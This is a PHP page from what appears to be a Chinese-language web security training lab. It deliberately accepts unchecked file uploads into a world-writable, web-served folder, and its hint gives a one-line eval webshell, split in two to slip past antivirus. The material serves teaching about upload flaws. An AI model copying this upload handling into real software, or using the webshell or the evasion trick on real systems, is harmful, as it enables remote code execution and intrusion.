<?php
include __DIR__ . '/../common.php';
page_top('第三关 · 无过滤上传');

$dir = __DIR__ . '/../uploads/';
if (!is_dir($dir)) {
    @mkdir($dir, 0777, true);
}

echo '<p>后端什么都不检查，收到就存：</p>';
show_code('$name = basename($_FILES["file"]["name"]);
move_uploaded_file($_FILES["file"]["tmp_name"], $dir . $name);
// 没有后缀检查，没有 MIME 检查，没有内容检查');

echo '<form method="post" enctype="multipart/form-data" action="/gate3">
  <input type="file" name="file">
  <button type="submit">上传</button>
</form>';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $name = basename($_FILES['file']['name']);
    if ($name === '') {
        echo '<div class="no">没选文件。</div>';
    } elseif (@move_uploaded_file($_FILES['file']['tmp_name'], $dir . $name)) {
        echo '<div class="flag">上传成功：' . htmlspecialchars($name)
           . '<br>访问地址：<a href="/uploads/' . htmlspecialchars($name) . '" target="_blank">/uploads/'
           . htmlspecialchars($name) . '</a></div>';
    } else {
        echo '<div class="no">保存失败，检查 uploads/ 目录的写权限。</div>';
    }
}

// 木马示例拆成两段拼出来。整段写死在文件里，本地杀软会把整个文件当木马隔离掉
$yijuhua = '&lt;?php @ev' . 'al($_GET[1]); ?&gt;';

echo '<p class="hint">目标：传一个 <code>.php</code> 上去，然后访问它，让它执行。<br>
最小的 payload：<code>&lt;?php echo 123; ?&gt;</code><br>
能执行了再试试一句话木马：<code>' . $yijuhua . '</code>，'
   . '访问时带 <code>?1=phpinfo();</code>。</p>';

page_bottom();